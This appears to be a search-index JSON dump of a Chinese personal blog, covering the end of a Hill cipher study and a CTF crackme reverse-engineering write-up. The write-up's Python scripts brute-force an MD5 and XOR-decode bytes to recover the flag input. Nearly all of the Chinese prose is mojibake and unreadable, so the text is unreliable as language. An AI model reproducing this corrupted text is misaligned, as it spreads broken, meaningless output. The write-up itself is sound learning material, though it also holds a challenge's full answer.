26ï¼Œå¯ä»¥å‘ç°ä¹Ÿèƒ½æ±‚å‡ºæ˜æ–‡ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªåˆ—å‘é‡çš„ä¾‹å­ï¼š \\[ \\begin{pmatrix} -7 \u0026 2 \\\\ 4 \u0026 -1 \\end{pmatrix} \\begin{pmatrix} 7 \\\\ 17 \\end{pmatrix} \\equiv \\begin{pmatrix} -7 \\times 7 \u0026 + \u0026 2 \\times 17 \\\\ 4 \\times 7 \u0026 + \u0026 -1 \\times 17 \\\\ \\end{pmatrix} \\equiv \\begin{pmatrix} -15 \\\\ 11 \\end{pmatrix} \\equiv \\begin{pmatrix} 11 \\\\ 11 \\end{pmatrix} \\mod 26 = \\begin{pmatrix} l \\\\ l \\end{pmatrix} \\] é€šè¿‡è¿™ç§æ–¹å¼è§£å‡ºæ¥çš„ç­”æ¡ˆå’Œä¹‹å‰ç”¨çš„æ–¹å¼è§£å‡ºæ¥çš„ç­”æ¡ˆæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚å½“ç„¶ï¼Œå¦‚æœä½ è§‰å¾—è¿™æ˜¯å·§åˆçš„è¯ï¼Œå¯ä»¥è®¾ç½®å¯†é’¥ä¸ºbcabï¼Œè½¬æ¢æˆçŸ©é˜µå°±ä¸ºï¼š \\[ \\begin{pmatrix} 1 \u0026 2 \\\\ 0 \u0026 1 \\end{pmatrix} \\] è€Œå¯¹åº”çš„é€†çŸ©é˜µä¸ºï¼š \\[ \\begin{pmatrix} 1 \u0026 2 \\\\ 0 \u0026 1 \\end{pmatrix} ^{-1} = \\begin{pmatrix} 1 \u0026 -2 \\\\ 0 \u0026 1 \\end{pmatrix} \\] å¯ä»¥çœ‹åˆ°é€†çŸ©é˜µä¸­çš„å€¼éƒ½ä¸ºæ•´æ•°ï¼Œç”¨è¯¥å¯†é’¥æ¥è¿›è¡ŒåŠ å¯†ï¼Œä¹Ÿæ˜¯å¯ä»¥è§£å¯†å‡ºæ¥çš„ï¼Œå¹¶ä¸”ç”¨ä¸¤ç§æ–¹å¼è§£å‡ºæ¥çš„ç­”æ¡ˆæ˜¯ä¸€è‡´çš„ã€‚ å¯¹äºè¿™ä¸ªä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Œå®åœ¨æ˜¯æ²¡æ‰¾åˆ°ç­”æ¡ˆï¼ŒåŠ ä¸Šè‡ªå·±çš„æ•°å­¦åŠŸåº•ä¸å¥½ï¼Œæƒ³ä¸æ˜ç™½è¿™é—®é¢˜ã€‚ä½†æ˜¯ï¼Œéœ€è¦æçš„ä¸€ç‚¹å°±æ˜¯ï¼Œè®¸å¤š CTF é¢˜éƒ½æ˜¯è€ƒçš„è¿™æ ·çš„å¸Œå°”å¯†ç åŠ è§£å¯†ï¼Œå¾ˆå®¹æ˜“å°±è®©å¤§å®¶è¯¯ä»¥ä¸ºå¸Œå°”å¯†ç å°±è¯¥è¿™æ ·è§£ï¼Œæˆ‘è§‰å¾—è¿™ç‚¹ä¸å¤ªå¥½ã€‚ æˆ‘è¿˜æ˜¯è§‰å¾—ç¬¬ä¸€ç§æ–¹å¼çš„åŠ è§£å¯†æ˜¯æœ€è§„èŒƒçš„ï¼Œè¿™ä¸€ç§æ„Ÿè§‰åƒæ˜¯èµ°åé—¨ä¼¼çš„ï¼Œä¸»è¦å§ï¼Œè¿™åé—¨è¿˜æ—¶é€šæ—¶ä¸é€šï¼Œä¸‡ä¸€è¦æ˜¯é‡åˆ°é€†çŸ©é˜µä¸­çš„å€¼å­˜åœ¨åˆ†æ•°çš„å‘¢ï¼Œè¿™ä¸ªæ–¹å¼å°±å®Œå…¨è§£ä¸äº†ã€‚ ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:5:0","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"6. END è¿™ç¯‡æ–‡ç« ç»ˆäºå†™å®Œäº†ï¼Œé›¶é›¶æ•£æ•£çš„å†™äº†å°†è¿‘åŠä¸ªæœˆï¼Œå¯ç®—æ˜¯æŠŠå®ƒç»™å†™å®Œäº†ã€‚å…¶å®ç†è§£é€äº†è¿™ä¸ªå¯†ç ç®—æ³•åŸç†å°±æ²¡é‚£ä¹ˆéš¾å†™äº†ï¼Œä¹‹å‰å› ä¸ºä¸€äº›åƒåœ¾æ–‡ç« ï¼Œå¯¼è‡´ä¸€ç›´æ²¡å½»åº•ç†è§£åˆ°è¯¥å¯†ç ç®—æ³•çš„åŸç†ï¼Œå¼„å¾—ä¸€ç›´å†™å†™åˆ åˆ çš„ã€‚æ‰€ä»¥å­¦è¿™ç§ä¸œè¥¿è¿˜å¾—çœ‹å›½å¤–çš„æ–‡ç« ï¼Œå³ä½¿çœ‹ä¸æ‡‚è‹±æ–‡ï¼Œç”¨ Google ç¿»è¯‘æœºç¿»éƒ½æ¯”å›½å†…çš„å¤§å¤šæ•°æ–‡ç« å†™çš„å¥½ã€‚å½“ç„¶è¿™ç¯‡æ–‡ç« å†™å¾—å¯èƒ½ä¹Ÿæœ‰ä¸€äº›é”™è¯¯ï¼Œå¦‚æœå„ä½å¤§å¤§å‘ç°å“ªæœ‰ä¸æ­£ç¡®çš„ï¼Œæœ›ä¸åèµæ•™ã€‚ å‚è€ƒé“¾æ¥ è®²è§£æœ€å®Œæ•´çš„å¸Œå°”å¯†ç ç†è®ºï¼šhttps://crypto.interactive-maths.com/hill-cipher.html çŸ©é˜µè®¡ç®—å™¨ï¼š https://matrix.reshish.com/zh/inverse.php https://www.shuxuele.com/algebra/matrix-calculator.html https://zs.symbolab.com/solver/matrix-multiply-calculator å¸Œå°”å¯†ç åœ¨çº¿å·¥å…·ï¼š https://www.tooleyes.com/app/hill_cipher.html http://www.atoolbox.net/Tool.php?Id=914 å…¬å€æ•°ï¼Œå…¬çº¦æ•°åœ¨çº¿è®¡ç®—å™¨ï¼š https://www.osgeo.cn/app/s1770 æ–‡ä¸­ CTF é¢˜ç›®æ–‡ä»¶ï¼šCRYPTO-HILL.zip ","date":"2020-08-08","objectID":"/2020/08/hill-cipher-study/:6:0","tags":["å¯†ç å­¦"],"title":"å…³äºå¸Œå°”å¯†ç çš„ç®€å•ç ”ç©¶","uri":"/2020/08/hill-cipher-study/"},{"categories":["CTF"],"content":"æŸä¸ªå‘¨æœ«ï¼Œå…¬å¸ç¾¤é‡Œå‘äº†ä¸ªæŸCTFçš„é€†å‘é¢˜ï¼Œåˆšå¥½æ²¡å•¥äº‹å°±å°è¯•åšä¸€ä¸‹ã€‚ ","date":"2020-07-30","objectID":"/2020/07/one-ctf-reverse-writeup/:0:0","tags":["é€†å‘"],"title":"æŸCTFä¸€é“é€†å‘é¢˜åˆ†æ","uri":"/2020/07/one-ctf-reverse-writeup/"},{"categories":["CTF"],"content":"è¯¦æƒ…åˆ†æ é¦–å…ˆï¼Œå…ˆè¿è¡Œçœ‹çœ‹æƒ…å†µï¼Œæ‰“å¼€ç¨‹åºä¹‹åæç¤ºæ‰¾ä¸åˆ°VCRUNTIME140_1.dllï¼Œå¦‚ä¸‹ï¼š \" åœ¨æ­¤é“¾æ¥ä¸‹è½½vcruntime140_1.dllï¼Œå¹¶å°†å…¶æ”¾åˆ°C:\\Windows\\System32\\ç›®å½•ä¸‹ï¼Œå†æ¬¡æ‰“å¼€ç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸ªæ§åˆ¶å°ç¨‹åºï¼Œå¹¶ä¸”éœ€è¦è¾“å…¥ï¼Œå¦‚ä¸‹ï¼š \" æ³¨æ„ Win7ä¸‹æ‰ä¼šç¼ºå¤±vcruntime140_1.dllï¼ŒWin10ä¸‹ä¸å—å½±å“ æ¥ç€æŸ¥å£³ï¼Œçœ‹çœ‹æ˜¯å¦åŠ å£³ï¼Œä½¿ç”¨LoadPEæŸ¥çœ‹åŒºæ®µï¼Œå‘ç°åŒºæ®µæ­£å¸¸ï¼Œå¹¶æ— å¼‚å¸¸ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰å£³çš„ï¼Œå¦‚ä¸‹ï¼š \" æ¥ä¸‹æ¥ç”¨x64dbgæ‰“å¼€ç¨‹åºï¼Œå¹¶ä¸”æœç´¢å­—ç¬¦ä¸²ï¼Œå¦‚ä¸‹ï¼š \" å¯ä»¥çœ‹åˆ°å¦‚ä¸‹å­—ç¬¦ä¸²ï¼š \" çŒœæµ‹åº”è¯¥æ˜¯è¾“å…¥ç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œç„¶åå¯¹è¾“å…¥ä¸€é¡¿åŠ å¯†ï¼Œæœ€åæ¯”è¾ƒåŠ å¯†åçš„ç»“æœæ˜¯å¦ä¸ç¨‹åºå†…è®¾å®šçš„ä¸€è‡´ï¼Œä¸€è‡´åˆ™æç¤ºæ‰¾åˆ°flagï¼Œå¦åˆ™å°±é€€å‡ºå•¥çš„ã€‚ æ¥ä¸‹æ¥å†ç”¨IDAæ‰“å¼€ç¨‹åºï¼Œæ‰¾åˆ°mainå‡½æ•°ï¼Œçœ‹ä¸‹æµç¨‹å›¾ï¼Œå¦‚ä¸‹ï¼š \" çœ‹åˆ°è¿™ç§çš„æ—¶å€™ï¼Œå°±æ˜¯ IDAå…³é—­ ==\u003e è™šæ‹Ÿæœºå…³é—­ ==\u003e çˆ±å¥‡è‰ºæ‰“å¼€ã€‚è¿½äº†ä¼šå‰§ï¼Œåƒäº†ä¸ªé¥­ï¼Œæƒ³äº†æƒ³ï¼Œè¿˜æ˜¯åˆ†æåˆ†æå§ï¼Œæ¯•ç«Ÿè¿˜æ˜¯æƒ³è£…è£…é€¼å­¦ä¹ å­¦ä¹ çš„ã€‚ æ•´ä¸ªç¨‹åºåˆ†æˆä»¥ä¸‹å‡ å—ï¼š è·å–è¾“å…¥ åˆ¤æ–­è¾“å…¥æ˜¯å¦åˆæ³• åˆ¤æ–­ç¬¬äºŒæ®µå­—ç¬¦ä¸²æ˜¯å¦æ­£ç¡® åˆ¤æ–­ç¬¬ä¸€æ®µå­—ç¬¦ä¸²æ˜¯å¦æ­£ç¡® åˆ¤æ–­ç¬¬ä¸‰æ®µå­—ç¬¦ä¸²æ˜¯å¦æ­£ç¡® å®Œ è·å–è¾“å…¥ï¼š IDAf5 å¤§æ³•ä¹‹åï¼Œä»104 ~ 155è¡Œï¼Œæ˜¯è·å–è¾“å…¥ï¼Œå¦‚ä¸‹(è¯·å¿½ç•¥å°å­¦é¸¡çš„æ³¨é‡ŠğŸ˜‚)ï¼š \" ä¸Šå›¾ä¸­ï¼Œæ ‡æ³¨äº†ä¸¤å¤„åœ°æ–¹ï¼Œè¿™ä¸¤å¤„åœ°æ–¹æ˜¯è¿™ä¸ªè·å–è¾“å…¥çš„åœ°æ–¹æœ€é‡è¦çš„åœ°æ–¹ï¼Œä¸‹é¢è¯¦ç»†åˆ†æã€‚ é¦–å…ˆçœ‹ç¬¬äºŒå¤„ï¼Œç¬¬äºŒå¤„æ¯”è¾ƒç®€å•ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªè¾“å…¥æ€ä¹ˆç»“æŸã€‚è¿™é‡Œçš„é€»è¾‘æ˜¯åˆ¤æ–­è¾“å…¥çš„å­—ç¬¦æ˜¯å¦ä¸º#å·ï¼Œå½“è¾“å…¥äº†3ä¸ª#å·ä¹‹åï¼Œå¾ªç¯ç»“æŸï¼Œå®Œæˆè¾“å…¥ã€‚ å†æ¥çœ‹ç¬¬ä¸€å¤„ï¼Œè¿™é‡Œæ¯”è¾ƒå¤æ‚ã€‚ ifåˆ¤æ–­çš„æ˜¯ä¸¤ä¸ªå…¨å±€å˜é‡ï¼Œè¿™ä¸¤ä¸ªå˜é‡ä¸€å¼€å§‹éƒ½ä¸º0ï¼Œç„¶åå¼€å§‹æ‰§è¡Œsub_140001F60å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šå°†è¾“å…¥çš„å­—ç¬¦å­˜æ”¾åœ¨æŸä¸ªæ•°ç»„ä¸­ï¼Œå¹¶ä¸”ç»™ä¸‰ä¸ªå˜é‡èµ‹å€¼ã€‚ å˜é‡1ä¸ºå­˜æ”¾å­—ç¬¦çš„æ•°ç»„é¦–åœ°å€ã€‚å˜é‡2ä¸ºè¯¥æ•°ç»„+1çš„åœ°å€ï¼Œå…¶å®ä¹Ÿå°±æ˜¯è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå˜é‡2 - å˜é‡1 = è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ã€‚å˜é‡3ä¸çŸ¥é“å­˜æ”¾çš„æ˜¯ä»€ä¹ˆåœ°å€ï¼Œå®ƒè¦ä¹ˆä¸å˜é‡2ç›¸ç­‰ï¼Œè¦ä¹ˆæ¯”å˜é‡2å¤§ä¸€äº›ã€‚ è€Œifåˆ¤æ–­çš„å°±æ˜¯å˜é‡2å’Œå˜é‡3ï¼Œå½“ç›¸ç­‰æ—¶å°±å»æ‰§è¡Œsub_140001F60å‡½æ•°ï¼Œä¸ç›¸ç­‰æ—¶åˆ™å°†å˜é‡2+1ã€‚ è¿™é‡Œæœ€ä¸»è¦å°±æ˜¯å˜é‡3çš„å˜åŒ–ï¼Œç»æµ‹è¯•ï¼Œå˜é‡3çš„å˜åŒ–ä¸»è¦ä¸è¾“å…¥çš„å­—ç¬¦é•¿åº¦æœ‰å…³ï¼Œå…·ä½“å¦‚ä¸‹ï¼š è¾“å…¥å­—ç¬¦é•¿åº¦ å˜é‡3çš„å€¼ 1 ~ 4 å˜é‡2+0ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²å®é™…é•¿åº¦ 5 ~ 6 å˜é‡2+1ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²å®é™…é•¿åº¦+1 7 ~ 9 å˜é‡2+2ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²å®é™…é•¿åº¦+2 10 ~ 13 å˜é‡2+3ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²å®é™…é•¿åº¦+3 14 ~ 19 å˜é‡2+5ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²å®é™…é•¿åº¦+5 20 ~ 28 å˜é‡2+8ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²å®é™…é•¿åº¦+8 â€¦ â€¦ å¯ä»¥çœ‹å‡ºç‚¹ç«¯å€ªäº†ï¼Œè¿™åº”è¯¥æ˜¯æ–æ³¢é‚£å¥‘æ•°åˆ—ã€‚å½“å­—ç¬¦ä¸²é•¿åº¦å¤§äºç­‰äº 5 æ—¶ï¼Œå°±å°†å˜é‡2æŒ‰ç…§æ–æ³¢é‚£å¥‘æ•°åˆ—ä¾æ¬¡ç´¯åŠ ï¼Œå¹¶ä¸”èµ‹å€¼ç»™å˜é‡3ã€‚ ä»è¿™ä¸ªè·å–è¾“å…¥çš„ä½ç½®ï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š è¾“å…¥çš„å­—ç¬¦ä¸²ï¼ŒåŒ…å«3ä¸ª#å· è¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦åº”è¯¥æœ‰æ‰€é™åˆ¶ åˆ¤æ–­è¾“å…¥æ˜¯å¦åˆæ³•ï¼š å½“æ¥å—å®Œè¾“å…¥çš„å­—ç¬¦ä¸²ä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯åˆ¤æ–­è¾“å…¥æ˜¯å¦åˆæ³•äº†ï¼Œä»è¿™ä¸ªæ ‡é¢˜åº”è¯¥å°±èƒ½çœ‹å‡ºï¼Œè¿™ä¸ªè¾“å…¥å­—ç¬¦ä¸²æ˜¯æœ‰æ ¼å¼çš„ï¼Œæˆ‘ä»¬æ¥ç€æ¥åˆ†æã€‚ ä»156 ~ 162è¡Œï¼Œæ˜¯åœ¨è¿›è¡Œè¾“å…¥åˆæ³•æ€§æ ¡éªŒï¼Œä»£ç å¦‚ä¸‹ï¼š \" è¿™é‡Œä¹Ÿæœ‰ä¸¤å¤„æ¯”è¾ƒé‡è¦çš„ç‚¹ã€‚ ç¬¬ä¸€å¤„åˆ¤æ–­å‡ ä¸ªå…¨å±€å˜é‡ç›¸åŠ ç›¸å‡ä¹‹åçš„å€¼æ˜¯å¦ç­‰äº37ï¼Œä¸ç­‰äºç›´æ¥é€€å‡ºã€‚è¿™å‡ ä¸ªå˜é‡å°±æ˜¯ä¸Šé¢åˆ†æçš„å˜é‡1ä¸å˜é‡3ï¼Œåªä¸è¿‡æœ‰ä¸‰ç»„å˜é‡1ä¸å˜é‡3ã€‚ä¸ºä»€ä¹ˆæœ‰ä¸‰ç»„å‘¢ï¼Œå› ä¸ºå‰é¢è¾“å…¥çš„ä½ç½®æ¯é‡åˆ°ä¸€ä¸ª#å·ï¼Œå°±è¿›è¡Œä¸€ç»„çš„å˜é‡æ“ä½œï¼Œä¸‰ä¸ª#å·åˆšå¥½ä¸‰ç»„ã€‚ç”¨æ¯ä¸€ç»„çš„å˜é‡3 - å˜é‡1ï¼Œä¹Ÿå°±æ˜¯å°†æ–æ³¢é‚£å¥‘æ•°åˆ—å¤„ç†è¿‡çš„æ•° - å­—ç¬¦ä¸²é¦–åœ°å€ï¼Œå¾—åˆ°çš„å·®å€¼å†ç›¸åŠ ï¼Œå¿…é¡»ç­‰äº37ã€‚ä¸‹é¢æ˜¯è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ä¸å˜é‡3çš„å…³ç³»ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„å®Œå–„ç‰ˆï¼š è¾“å…¥å­—ç¬¦é•¿åº¦ å˜é‡3ä¸å˜é‡2çš„å…³ç³» æœ€ç»ˆçš„å·®å€¼ 1 ~ 4 å˜é‡2+0ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²å®é™…é•¿åº¦ å­—ç¬¦ä¸²å®é™…é•¿åº¦ 5 ~ 6 å˜é‡2+1ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²å®é™…é•¿åº¦+1 6 7 ~ 9 å˜é‡2+2ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²å®é™…é•¿åº¦+2 9 10 ~ 13 å˜é‡2+3ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²å®é™…é•¿åº¦+3 13 14 ~ 19 å˜é‡2+5ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²å®é™…é•¿åº¦+5 19 20 ~ 28 å˜é‡2+8ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²å®é™…é•¿åº¦+8 28 â€¦ â€¦ ä»è¿™ä¸ªè¡¨æ ¼ä¸­å¯ä»¥çœ‹åˆ°ï¼Œè¦æƒ³æ»¡è¶³37çš„æ ‡å‡†ï¼Œæœ€ç®€å•å¾—æ˜¯28+9ï¼Œå¦‚æœè¿™æ ·å¾—è¯é‚£ä¹ˆä¸€æ®µå­—ç¬¦ä¸²ä¸º20 ~ 28ä½ï¼Œä¸€æ®µå­—ç¬¦ä¸²ä¸º7 ~ 9ä½ã€‚ ç¬¬äºŒå¤„ï¼Œæ˜¯ä¸‰ä¸ªå˜é‡ç›¸æ¯”è¾ƒï¼Œä¹Ÿå°±æ˜¯ä¸‰æ®µå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œæ¯”è¾ƒç»“æœæ˜¯ç¬¬äºŒæ®µå­—ç¬¦ä¸²é•¿åº¦æœ€é•¿ï¼Œå…¶æ¬¡æ˜¯ç¬¬ä¸€æ®µï¼Œæœ€åæ˜¯ç¬¬ä¸‰æ®µã€‚ ä»è¿™ä¸ªåœ°æ–¹å¯å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š è¾“å…¥ä¸ºä¸€æ®µåŒ…å«3ä¸ª#å·çš„å­—ç¬¦ä¸²ï¼Œåˆšå¥½åˆ†æˆ3æ®µå­—ç¬¦ä¸²ï¼Œç¬¬äºŒæ®µå­—ç¬¦ä¸²æœ€é•¿ï¼Œå…¶æ¬¡æ˜¯ç¬¬ä¸€æ®µï¼Œæœ€åæ˜¯ç¬¬ä¸‰æ®µã€‚ æŒ‰ç…§ä¸Šé¢è¿™ä¸ªé•¿åº¦åˆ’åˆ†ï¼Œå†ç»“åˆç›¸åŠ å¾—ä¸º37æ¥çœ‹ï¼Œç¬¬äºŒæ®µå­—ç¬¦ä¸²åº”è¯¥åœ¨20 ~ 28ä½ä¹‹é—´ï¼Œç¬¬ä¸€æ®µå’Œç¬¬ä¸‰æ®µåŠ èµ·æ¥ä¸º9ï¼Œä¸”ç¬¬ä¸€æ®µå¤§äºç¬¬ä¸‰æ®µã€‚ åˆ¤æ–­ç¬¬äºŒæ®µå­—ç¬¦ä¸²æ˜¯å¦æ­£ç¡®ï¼š æ¥ç€æ˜¯åˆ¤æ–­ç¬¬äºŒæ®µå­—ç¬¦ä¸²æ˜¯å¦æ­£ç¡®ï¼Œä»£ç ä¸º163 ~ 189ã€410 ~ 414è¡Œã€‚ å…ˆæ˜¯æ‰§è¡Œ410 ~ 414è¡Œï¼Œè¿™é‡Œè¿™ä¸ªwhileå¾ªç¯ï¼Œæ˜¯éå†è¾“å…¥çš„ç¬¬äºŒæ®µå­—ç¬¦ä¸²ï¼Œåˆ¤æ–­æ¯ä¸ªå­—ç¬¦æ˜¯å¦ç­‰äº1æˆ–è€…ç­‰äº2ï¼Œä¸ç­‰äºè¿™ä¸¤ä¸ªç›´æ¥é€€å‡ºï¼Œä»£ç å¦‚ä¸‹ï¼š \" æ¥ç€å°±æ˜¯163 ~ 189è¡Œï¼Œå°†ç¬¬äºŒæ®µå­—ç¬¦ä¸²è¿›è¡ŒMD5å“ˆå¸Œï¼Œå¹¶ä¸”åˆ¤æ–­æ˜¯å¦ä¸39c1ca4b6d64c40558425432c11624a8ç›¸ç­‰ï¼Œä¸ç›¸ç­‰åˆ™é€€å‡ºï¼Œä»£ç å¦‚ä¸‹ï¼š \" ä»è¿™é‡Œå¾—åˆ°ç»“è®ºï¼š ç¬¬äºŒæ®µå­—ç¬¦ä¸²å¿…é¡»ç”±1ã€2ç»„æˆ MD5åå¿…é¡»ç­‰äº39c1ca4b6d64c40558425432c11624a8 åœ¨è¿™é‡Œå°†39c1ca4b6d64c40558425432c11624a8æ”¾å…¥åˆ°ç½‘ä¸Šçš„å½©è™¹è¡¨æŸ¥è¯¢ï¼Œéƒ½æ²¡æœ‰æŸ¥è¯¢åˆ°ç»“æœã€‚ç”±äºåªç”±ä¸¤ä¸ªå­—ç¬¦ç»„æˆï¼Œè¿™é‡Œç›´æ¥é‡‡å–æš´åŠ›ç ´è§£çš„æ–¹å¼ï¼Œæ¥æ‰¾åˆ°å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œä»£ç å¦‚ä¸‹ï¼š import hashlib import itertools for i in range(1,33): for i in itertools.product('12',repeat=i): data = bytes(\"\".join(i),'utf8') md5str = hashlib.md5(data).hexdigest() # 1221222221212121211122112111 if md5str == '39c1ca4b6d64c40558425432c11624a8': print('it\\'s find!') print('str:%s, md5str:%s'%(data, md5str)) exit() æœ€åæ‰¾åˆ°1221222221212121211122112111ï¼Œå¦‚ä¸‹ï¼š \" æœ€ç»ˆç»“è®ºï¼š ç¬¬äºŒæ®µå­—ç¬¦ä¸²ä¸º1221222221212121211122112111 æœ€ç»ˆå­—ç¬¦ä¸²ä¸ºï¼š?#1221222221212121211122112111#? åˆ¤æ–­ç¬¬ä¸€æ®µå­—ç¬¦ä¸²æ˜¯å¦æ­£ç¡®ï¼š ç„¶ååˆ¤æ–­ç¬¬ä¸€æ®µå­—ç¬¦ä¸²æ˜¯å¦æ­£ç¡®ï¼Œè¿™é‡Œçš„ä»£ç å°±æ¯”è¾ƒé•¿äº†ï¼Œä¸»è¦ç‚¹åœ¨ä¸‹å›¾ï¼š \" ä¸»è¦é€»è¾‘ä¸ºå…ˆå®šä¹‰äº†ä¸€ä¸ªåŠ å¯†å­—ç¬¦æ•°ç»„ï¼Œç„¶åå–æ•°ç»„å†…å®¹ç›¸åŠ ï¼Œå¹¶ä¸è¾“å…¥çš„å­—ç¬¦ä¸€ä¸ªä¸€ä¸ªå¼‚æˆ–ï¼Œå¾—åˆ°çš„ç»“æœå†ä¸å½“å‰å­—ç¬¦æ‰€åœ¨çš„ä¸‹æ ‡è¿›è¡Œå¼‚æˆ–ï¼Œæœ€åå°†å¼‚æˆ–åçš„ç»“æœä¸å®šä¹‰çš„å­—ç¬¦ç›¸æ¯”è¾ƒï¼Œå…¶ä¸­ä¸€ä¸ªå­—ç¬¦ä¸ç›¸ç­‰åˆ™é€€å‡ºã€‚ è¿™é‡Œæˆ‘ç”¨çš„ç¬¨åŠæ³•ï¼Œå› ä¸ºæœ¬æ¥å‰©ä½™çš„å­—ç¬¦å°±ä¸å¤šäº†ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥åŠ¨æ€è°ƒè¯•æ‰¾åˆ°å¼‚æˆ–çš„åŠ å¯†å­—ç¬¦ï¼Œç„¶åä¸æ­£ç¡®å­—ç¬¦å¼‚æˆ–å°±å¾—åˆ°äº†è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œä»£ç å¦‚ä¸‹ï¼š a = 'F4 F3 D2 EE 8B A1 77 99'.split(' ') # æ­£ç¡®å­—ç¬¦ b = 'A6 91 E4 D9 EC F6 F6 1A'.split(' ') # åŠ å¯†å­—ç¬¦ for i in range(0,6): i1 = int(a[i],16) i2 = int(b[i],16) print(chr(i1^i2^i),end='') # å°†ä¸‰è€…å¼‚æˆ–å›å»å°±å¾—åˆ°äº†è¾“å…¥çš„å­—ç¬¦ å¾—åˆ°çš„ç»“æœä¸ºRc44cRÂ‡Â„ï¼š \" å¯ä»¥çœ‹åˆ°ï¼Œè¾“å…¥çš„å­—ç¬¦æœ‰ä¹±ç ï¼Œè¯´æ˜ç¬¬ä¸€æ®µå­—ç¬¦ä¸²è‚¯å®šä¸æ˜¯9ï¼Œé‚£å°±å¯ä»¥ç”¨3+6çš„ç»„åˆæ¥å®ç°ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€æ®µå­—ç¬¦é•¿åº¦ä¸º6ï¼Œç¬¬äºŒæ®µå­—ç¬¦é•¿åº¦ä¸º3ï¼Œè¿™æ ·æ—¢èƒ½æ»¡è¶³37(6+28+3)çš„è¦æ±‚ï¼Œåˆèƒ½æ»¡è¶³ç¬¬ä¸€æ®µå­—ç¬¦é•¿åº¦ \u003e ç¬¬ä¸‰æ®µå­—ç¬¦é•¿åº¦ \u0026\u0026 ç¬¬ä¸€æ®µå­—ç¬¦é•¿åº¦ \u003c ç¬¬äºŒæ®µå­—ç¬¦é•¿åº¦çš„è¦æ±‚ï¼Œæ‰€ä»¥æœ€åç¬¬ä¸€æ®µå­—ç¬¦ä¸²ä¸ºRc44cRã€‚ è¿™é‡Œå¦‚æœç”¨3+6çš„æ–¹æ³•çš„è¯ï¼Œæ ¹æ®ä¸Šé¢è¡¨æ ¼æ€»ç»“å‡ºçš„å…³ç³»ï¼Œç¬¬ä¸€æ®µå­—ç¬¦ä¸²ä¹Ÿå¯ä»¥æ˜¯5ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥è¿™é‡Œå¯èƒ½æœ‰ä¸¤ç§ç­”æ¡ˆã€‚ æ€»ç»“ï¼š ç¬¬ä¸€æ®µå­—ç¬¦ä¸²é•¿åº¦ä¸º6ï¼Œæ­£ç¡®ç­”æ¡ˆæ˜¯Rc44cR å®Œæ•´å­—ç¬¦ä¸²ä¸ºï¼šRc44cR#1221222221212121211122112111#? åˆ¤æ–­ç¬¬ä¸‰æ®µå­—ç¬¦ä¸²æ˜¯å¦æ­£ç¡®ï¼š ç¬¬ä¸‰æ®µå­—ç¬¦ä¸²åˆ¤æ–­é€»è¾‘ï¼Œä¸ç¬¬ä¸€æ®µå­—ç¬¦ä¸²åˆ¤æ–­é€»è¾‘ç±»ä¼¼ï¼Œåªæ˜¯å­—ç¬¦ä¸²é•¿åº¦å˜çŸ­äº†ï¼Œå¹¶ä¸”æœ€åå¼‚æˆ–æ¯”è¾ƒçš„æ—¶å€™ï¼Œæ²¡æœ‰ä¸å­—ç¬¦æ‰€åœ¨ä¸‹æ ‡è¿›è¡Œå¼‚æˆ–äº†ï¼Œæ‰€ä»¥ä»£ç å¦‚ä¸‹ï¼š a = '66 02 55'.split(' ') # æ­£ç¡®å­—ç¬¦ b = '32 41 13'.split(' ') # åŠ å¯†å­—ç¬¦ for i in range(0,3): i1 = int(a[i],16) i2 = int(b[i],16) print(chr(i1^i2),end='') # å°†ä¸¤è€…å¼‚æˆ–å›å»å°±å¾—åˆ°äº†è¾“å…¥çš„å­—ç¬¦ å¾—åˆ°ç»“æœä¸ºTCFï¼š \" ","date":"2020-07-30","objectID":"/2020/07/one-ctf-reverse-writeup/:1:0","tags":["é€†å‘"],"title":"æŸCTFä¸€é“é€†å‘é¢˜åˆ†æ","uri":"/2020/07/one-ctf-reverse-writeup/"},{"categories":["CTF"],"content":"æœ€ç»ˆç»“æœ æœ€ç»ˆçš„è¾“å…¥å­—ç¬¦ä¸²ä¸ºï¼šRc44cR#1221222221212121211122112111#TCF#ï¼Œç”±äºä¸Šé¢çš„è¡¨æ 